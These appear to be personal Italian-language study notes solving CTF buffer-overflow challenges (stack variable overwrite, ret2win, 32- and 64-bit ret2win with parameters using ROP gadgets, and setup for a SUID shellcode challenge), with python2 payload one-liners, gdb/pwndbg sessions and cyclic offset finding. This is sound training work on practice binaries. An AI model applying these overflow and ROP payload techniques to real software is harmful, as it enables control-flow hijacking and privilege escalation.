OVFLW SOLUTIONS:

https://github.com/Crypto-Cat/CTF/tree/main

NB ----> in tutto il file si intende che gdb venga runnato in pwndbg.

02-overwriting_stack_variables_part2:

$ file overwrite
$ checksec overwrite
$ ghidra -> per disassemblarlo (o qualsiasi altro r2/gef/..)
------ scopriamo che il buffer_input è di 32 byte
$ phython2 -c 'print 32 * "A" + "deadbeef"'
$ ./ovewrite >> yes? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdeadbeef 
------ dal fatto che l'output restituito:	
	$ unhex "output" -> in questo caso restituiva "daed" (al contrario quindi) si evince che:
$ phython2 -c 'print 32 * "A" + "\xef\xbe\xad\xde"' > payload    ---> -c per eseguire direttamente dalla stringa, \x indica che i sinboli seguenti rappresentano un byte in esadecimale
$ cat payload --> per verficare
$ ./overwrite < payload ------->>> SOLVED

cheattare usando i registri:
$ gdb overwrite
$ info function
$ break punto_in_cui_avviene_compare_trovato_con_ghidra
$ run
>> yes? "test" 
$ x $ebp - 0xc 
>> 0x12345678
$ set *indirizzo = 0xdeadbeef
$ c
>> god job!

Scrivendo un file python chiamato  exploit, con una semplice esecuzione possiamo tenere traccia di tutte le informazioni scoperte nell'analisi del file.

03-return_to_win:

Dopo le classiche funzioni di analisi. ---> come in quella di prima da LSB executable capiamo che è eseguibile dal Less Significant Bit quindi parte da dx a sx ovvero al contrario.

$ gdb ret2win
$ cyclic 100 -> crea una sequenza ciclica di 100 caratteri aaaabaaacaaad…yaaa
$ run (senza debug) per testare fino a dove arriva prima di andare in segmentation fault
>> Name: output_di_cyclic_100
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────
 EAX  0x6f
 EBX  0x61616166 ('faaa')
 ECX  0
 EDX  0
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd074 —▸ 0xffffd245 ◂— '/home/gianny/Desktop/buffer_overflow/CTF/pwn/binary_exploitation_101/03-return_to_win/ret2win'
 EBP  0x61616167 ('gaaa')
 ESP  0xffffcfb0 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EIP  0x61616168 ('haaa')
────────────────────[ DISASM / i386 / set emulate on ]───────────────────────

NB___________________________________________________

Potremmo potenzialmente sovrascrivere gli indirizzi  |
in modo che EIP punti ad ESP dentro il quale abbiamo |
iniettato codice malevolo (bad shell code).	     |
_____________________________________________________|

$ cyclic -l haaa -> serve per dirci dopo quante lettere si arriva ad "haaa" che è l'ultimo punto che finisce nell'EIP (puntatore con il return address di cui vogliamo sovrascrivere il contenuto), tutto il resto andrà a finire in ESP.
$ disassemble hacked -> perché come ho notato dallo pseudo-code di ghidra è li che mi interessa arrivare, quindi disassemblo per prendere il primo indirizzo e settare l'indirizzo di ritorno
$ python2 -c 'print 28*"A"+"\x82\x91\x04\x08"' > payload
$ gdb ret2win
$ run < payload
>>
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA  
This function is TOP SECRET! How did you get in here?! :O

Program received signal SIGSEGV, Segmentation fault.

04-ret2win_params:   32 bit

-----> SHELL1
$ file ret2win_params
$ checksec ret2win_params
$ ghidra -> per analizzare un minimo
$ gdb ret2win_params 
$ cyclic 200
$ run 

>> 	Name: "Output_of_cyclic_200"
$ cyclic -l haaa

>> 	Finding cyclic pattern of 4 bytes: b'haaa' (hex: 0x68616161)
	Found at offset 28

$ disassemble hacked --> prendo il primo indirizzo che vedo elencato (ovvero 0x08049182)

----> SHELL2
PAYLOAD:
Il payload sembra essere così composto:
python2 -c 'print "payload" + "hacked" + "return_address" + "param_1" + "param_2"'

$ python2 -c 'print 28 * "A" + "\x82\x91\x04\x08" + "AAAA" + "BBBB" + "CCCC"' > payload

----> SHELL 1
$ gdb ret2win_params
$ disassemble register_name -> prendo il return_address (0x0804922a)
$ break *0x0804922a
$ run < payload
$ n -> finché non troviamo una comparazione (n sta per next)
$ x $ebp + 8
>> 0x42424242 --> sarebbero le BBBB in hex
Visto che il cmp non va a buon fine non vedremo mai le CCCC ma andremo direttamente al return
perciò sostituiamo le BBBB con \xef\xbe\xad\xde

----> SHELL 2
$ python2 -c 'print 28 * "A" + "\x82\x91\x04\x08" + "junk" + "\xef\xbe\xad\xde" + "CCCC"' > payload

----> SHELL 1
$ gdb ret2win_params
$ break *0x0804922a
$ run < payload
$ n -> finché non troviamo una comparazione (n sta per next)
$ x $ebp + 0xc
>> 0x43434343 --> Sarebbero le CCCC in hex

----> SHELL 2
$ python2 -c 'print 28 * "A" + "\x82\x91\x04\x08" + "junk" + "\xef\xbe\xad\xde" + "\xbe\xba\xde\xc0"' > payload

----> SHELL 1 
./ret2win_params < payload --> fatto!	Notiamo che l'inidirizzo di ritorno non è
					importante, ho messo junk giusto perchè sono 4
					byte che seppur invalidi rispettano la lunghezza


04-ret2win_params:   64 bit

----> SHELL 1
$ gdb 
$ cyclic 100
$ run 
>> Name: "output_of_cyclic_100"
$ cyclic -l gaaa (nel mio caso ho dovuto scrivere daaaaaaa e non gaaa) 
>> 	Finding cyclic pattern of 8 bytes: b'daaaaaaa' 
	(hex: 0x6461616161616161)
	Found at offset 24
$ disassemble hacked --> 	prendo l'indirizzo di hacked 						0x0000000000401142 e lo inverto a due a due
				\x42\x11\x40\x00\x00\x00\x00\x00
				
----> SHELL 2
Come sara il payload? 
padding + pop_rdi + param_1 + pop_rsi + param_2 + hacked

param_1: deadbeef -> \xef\xbe\xad\xde -> x2 essendo a 64 bit -> \xef\xbe\xad\xde\xef\xbe\xad\xde

python2 -c 'print "A" * 24 + 
"\xef\xbe\xad\xde\xef\xbe\xad\xde" + 
"\x42\x11\x40\x00\x00\x00\x00\x00"'

Come si vede abbiamo vari pop nell'offset e quindi dobbiamo trovare 
un gadget che possa fare pop_rdi per passare deadbeef:

$ ropper --file ret2win_params --search "pop rdi"
>> 0x000000000040124b: pop rdi; ret;
prendiamo l'indirizzo e reversiamolo per il payload

python2 -c 'print "A" * 24 + 
"\x4b\x12\x40\x00\x00\x00\x00\x00" + 	---> pop_rdi
"\xef\xbe\xad\xde\xef\xbe\xad\xde" +	---> param_1
"\x42\x11\x40\x00\x00\x00\x00\x00"' 	---> hacked

$ ropper --file ret2win_params --search "pop rsi"
>> 0x0000000000401249: pop rsi; pop r15; ret;  
prendiamo l'indirizzo e reversiamolo per il payload
\x40\x12\x49\x00\x00\x00\x00\x00
Notiamo inoltre che non avviene solo una pop rsi, ma anche una pop r15,
il nostro payload si modifica in quanto qualcosa andrà a finire dentro r15:

padding + pop_rdi + param_1 + pop_rsi + param_2 + junk + hacked

python2 -c 'print "A" * 24 + 
"\x4b\x12\x40\x00\x00\x00\x00\x00" + 	---> pop_rdi
"\xef\xbe\xad\xde\xef\xbe\xad\xde" +	---> param_1
"\x40\x12\x49\x00\x00\x00\x00\x00" + 	---> pop_rsi_r15
"\xbe\xba\xde\xc0\xbe\xba\xde\xc0" +	---> param_2
"\x00\x00\x00\x00\x00\x00\x00\x00" +    ---> junk_param
"\x42\x11\x40\x00\x00\x00\x00\x00"' 	---> hacked

$ python2 -c 'print "A" * 24 + "\x4b\x12\x40\x00\x00\x00\x00\x00" + 
	"\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\x49\x12\x40\x00\x00\x00\x00\x00" 
	+ "\xb\xba\xde\xc0\xbe\xba\xde\xc0" + "\x00\x00\x00\x00\x00\x00\x00\x00"
	+ "\x42\x11\x40\x00\x00\x00\x00\x00"' > payload

FATTO!

05-injecting_custom_shellcode:

$ ls -lart --> 	in questo modo possiamo visionare anche tutti 
		i permessi e le cartelle 
In particolare, vediamo che flag.txt ha i seguenti permessi: -rw-------, ovvero solo il proprietario (root) ha il permesso di leggere e scrivere, mentre altri utenti non hanno alcun permesso.

$ cat flag.txt --> conferma il fatto che flag è protetto

$ sudo chown root:root flag.txt -->	 

utilizza sudo per elevare i privilegi e cambia l'owner e il gruppo di flag.txt a root:root. Questo è ridondante, poiché l'output del ls -lart mostra che flag.txt era già di proprietà di root. Il comando non cambia i permessi del file, ma cambia il proprietario (proprietario e gruppo).

$ sudo chmod 600 flag.txt --> 	permessi di tipo U-G-O (User, Group, Others)
				rwx | rwx | rwx --> 111 | 111 | 111 --> 777
				se scrivo 600 corrisponde a:
				6 = 110 | 0 = 000 | 0 = 000
				quindi: rw-------  il proprietario ha permesso
				di leggere e scrivere, mentre tutti gli altri
				utenti non hanno alcun permesso.
$ sudo chown root:root server
$ sudo chmod 4655 server -->	Il numero 4655 rappresenta i permessi in
				formato ottale. Il 4 iniziale indica il bit
				SUID (Set User ID).
				655: 110 | 101 | 101 --> rw-r-xr-x
				U (proprietario) legge e scrive ma non esegue
				G (gruppo) legge ed esegue ma non scrive
				O (altri) legge ed esegue ma non scrive
				
L'impostazione del bit SUID su un eseguibile fa sì che, quando eseguito, il programma venga eseguito con i permessi del proprietario del file (in questo caso, root), piuttosto che con i permessi dell'utente che lo ha eseguito. Questo è un meccanismo che può essere sfruttato per un'escalation dei privilegi.

Con queste impostazioni non dovremmo riuscire a leggere il contenuto di flag.

$ file server
$ checksec server
$ ghidra --> per poter aprire "server" su ghidra ho dovuto eseguire:
					$ sudo chown my_user:my_user server





















